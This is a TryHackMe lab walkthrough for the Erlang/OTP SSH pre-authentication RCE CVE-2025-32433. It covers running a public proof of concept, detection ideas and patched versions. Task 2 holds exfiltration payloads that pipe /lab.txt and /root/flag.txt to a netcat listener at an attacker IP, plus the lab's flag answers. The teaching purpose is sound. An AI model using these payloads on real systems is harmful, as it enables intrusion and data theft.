## Erlang/OTP SSH: CVE-2025-32433

Learn about and exploit Erlang/OTP SSH CVE-2025-32433 in a lab setup.
> [!NOTE]
>IMG: https://tryhackme-images.s3.amazonaws.com/room-icons/5f04259cf9bf5b57aed2c476-1745418138356

>Link: https://tryhackme.com/room/erlangotpsshcve202532433
>Info
>Room Type: walkthrough
>Free Room. Anyone can deploy virtual machines in the room (without being subscribed)!
>Created by: tryhackme,strategos,TactfulTurtle
>245 days ago
 


## Task 1 Introduction
Erlang and its companion framework, the Open Telecom Platform (OTP), form a powerful ecosystem for building distributed fault-tolerant systems. Erlang is a programming language designed to build scalable real-time systems that require high availability. Originally, Erlang was developed by Ericsson for telecommunication systems; however, it has evolved over the years to become a solution for various distributed computing challenges.

Erlang is used not only by a large number of companies for product development but also by many universities for research and even teaching. You can learn more about Erlang at their official page(https://www.erlang.org/faq/introduction.html).

OTP is a collection of middleware, libraries, and tools written in Erlang. Although the T in OTP stands for Telecom, OTP has evolved into a general-purpose framework for building distributed applications. In general, projects using Erlang are actually using Erlang along with its libraries, i.e., Erlang/OTP.

The Erlang/OTP SSH is an implementation of the SSH protocol as part of the Erlang OTP. It enables secure shell access and secure file transfers within Erlang-based systems. Recently, CVE-2025-32433(https://github.com/erlang/otp/security/advisories/GHSA-37cp-fgq5-7wc2), a critical vulnerability disclosed in the Erlang/OTP SSH implementation that allows unauthenticated remote code execution (RCE). This vulnerability was discovered by researchers from Ruhr University Bochum and has a CVSS score of 10.0 (https://nvd.nist.gov/vuln/detail/CVE-2025-32433 ) as it is considered critical.



## Task 2 Technical Background and Exploitation


This vulnerability exists due to Erlang/OTP’s implementation of the SSH protocol, particularly due to handling the connection protocol messages during the pre-authentication phase. According to this technical overview(https://www.upwind.io/feed/cve-2025-32433-critical-erlang-otp-ssh-vulnerability-cvss-10), SSH message numbers of 80 and higher are reserved for post-authentication. Consequently, if the SSH client sends an SSH message with such numbers before authentication is completed, the SSH server should disconnect them. The vulnerable servers do not enforce this, which gives the attackers plenty of windows to craft their messages and eventually attain unauthorized code execution.

A proof of concept (PoC) exploit code was written by Matthew Keeley(https://platformsecurity.com/blog/CVE-2025-32433-poc) and can be found here(https://github.com/ProDefense/CVE-2025-32433). The exploit works in four stages; the payload is sent in the fourth stage, which executes the attacker’s code before authentication is conducted.

 Note: Free users cannot access the Internet to download the exploit code to their AttackBox machines. As a result, we suggest that they access CVE-2025-32433.py (https://raw.githubusercontent.com/ProDefense/CVE-2025-32433/refs/heads/main/CVE-2025-32433.py) on their browsers, copy its content, and paste it into a proper file on their running AttackBox machines. Premium and business subscribers can follow the steps shown below directly.

You can download the exploit code using git clone on the AttackBox’s terminal, as shown in the terminal below.

```bash
AttackBox Terminal
root@attackbox:~# git clone https://github.com/ProDefense/CVE-2025-32433
Cloning into 'CVE-2025-32433'...
remote: Enumerating objects: 12, done.
remote: Counting objects: 100% (12/12), done.
remote: Compressing objects: 100% (10/10), done.
remote: Total 12 (delta 3), reused 8 (delta 2), pack-reused 0 (from 0)
Unpacking objects: 100% (12/12), 4.72 KiB | 483.00 KiB/s, done.
```
Next, we need to cd into the CVE-2025-32433 and edit the exploit code CVE-2025-32433.py to use our target’s IP address, MACHINE_IP, and port number, 22. The first six lines of the updated file should look like the following.
```bash
AttackBox Terminal
root@attackbox ~/CVE-2025-32433# head -n 6 CVE-2025-32433.py
import socket
import struct
import time

HOST = "MACHINE_IP"  # Target IP (change if needed)
PORT = 22  # Target port (change if needed)
[...]
```
Now, we are ready to run our exploit. Because this is a PoC, the payload is relatively harmless; it creates the file lab.txt with the contents being pwned. We are accessing an Erlang system via SSH; consequently, as you would expect, the payload is written in Erlang language: file:write_file("/lab.txt", <<"pwned">>).. If you want to create a more sophisticated payload, you must also write it in Erlang. Below is an example of the successful exploitation of the target VM.
```bash
AttackBox Terminal
root@attackbox ~/CVE-2025-32433# python3 CVE-2025-32433.py
[*] Connecting to SSH server...
[+] Received banner: SSH-2.0-Erlang/5.2.9
[*] Sending SSH_MSG_KEXINIT...
[*] Sending SSH_MSG_CHANNEL_OPEN...
[*] Sending SSH_MSG_CHANNEL_REQUEST (pre-auth)...
[✓] Exploit sent! If the server is vulnerable, it should have written to /lab.txt.
[+] Received response:
[...]
```
Confirming the Vulnerability
After executing the above exploit code on the attached VM, we would like to confirm that it was successful. This would be trivial if we had access to the system; however, to execute things from the adversary’s perspective, let’s assume that we don’t have such access. We need other ways to check if our file has been created successfully.

One approach to confirm the existence of the /lab.txt file and view its contents is to set a listener on the AttackBox. Let’s listen on port 4444 on the AttackBox using nc -lvp 4444.

```
AttackBox Terminal
root@attackbox:~# nc -lvp 4444
Listening on 0.0.0.0 4444
```
Our next step would be to adapt the payload to something more useful. We can replace the Erlang instruction to write a file, file:write_file("/lab.txt", <<"pwned">>)., with another one that sends the contents of the lab.txt file to our listener. In Erlang, os:cmd allows us to run system commands; therefore, we can use os:cmd("cat /lab.txt | nc CONNECTION_IP 4444"). to confirm the existence and contents of the created lab.txt file.

Please remember to add . at the end of each Erlang instruction. In other words, on line 108, command = 'file:write_file("/lab.txt", <<"pwned">>).' should be updated to command='os:cmd("cat /lab.txt | nc CONNECTION_IP 4444").' to pipe lab.txt contents to nc.
 

 What is the flag hidden in the root directory?<br>
    Payload `cat /root/flag.txt | nc IP 4444`.<br>
    **Answer:** `THM{U57U3P5KnR}`

 What is the hostname of the system?<br>
    Use `hostname`.<br>
    **Answer:** `c7b79fd068ba`
	
	
## Task 3 Detection
**Network-Based Detection**

The attack lies on an SSH protocol implementation layer, so SSH daemon logs would not provide you with reliable exploitation evidence. Still, the attack can be traced by reviewing the network traffic, where you would see the "SSH_MSG_CHANNEL_REQUEST" packet coming from an attacker to your server. The packet will contain a payload starting with the "exec" keyword and ending with an exact command to be executed on the target in plaintext.


https://tryhackme-images.s3.amazonaws.com/user-uploads/678ecc92c80aa206339f0f23/room-content/678ecc92c80aa206339f0f23-1745437299719.png

Firewall vendors are gradually implementing the NIDS/NIPS rules based on the described indicators, and researchers are coming up with Suricata alternatives. For example:


FortiGate IPS rule covering the attack: FortiGate Website (https://www.fortiguard.com/encyclopedia/ips/57832)

Example of Suricata IPS rule: Github Repository (https://github.com/darses/CVE-2025-32433/blob/main/suricata.rules)

**Host-Based Detection**

Besides the NIDS/NIPS approach, the attack can be detected at later stages. Since the vulnerability mainly affects network devices that usually control a network or one of its segments, attackers may use the exploited devices as a starting point to enter your Active Directory, production environment, or other sensitive network segment. Thus, you can build your hunts around detecting anomalous activities from the network devices to your servers or workstations. For example:

**On the exploited device (If you have filesystem access)**:

Unexpected file changes or new executable files created after the CVE disclosure
OS-specific persistences, like cronjobs for Linux, created after the CVE disclosure
Suspicious network traffic coming from the device to unrecognized external IPs 

**On other servers connected to the device**:

Unexpected logins or network scans from the network device to the monitored servers
Networking issues like connection errors, routing misconfigurations, or high latency



## Task 4 Mitigation

Many hardware and software products use Erlang/OTP; unfortunately, some of these products have their SSH exposed to the outside world. You must confirm if SSH is enabled on your products and whether it is affected. The OTP versions affected by this vulnerability are all the versions before and include the following:

OTP-27.3.2
OTP-26.2.5.10
OTP-25.3.2.19
Users should update their systems to a patched version to mitigate this issue. The patched versions available are the following:

OTP-27.3.3
OTP-26.2.5.11
OTP-25.3.2.20
Users are advised to disable the SSH server if an update is not feasible. When this is impossible, users should block access to the SSH server via the proper firewall rules.

Note:
If you enjoyed learning about this vulnerability, we recommend you check the Recent Threats module(https://tryhackme.com/module/recent-threats).
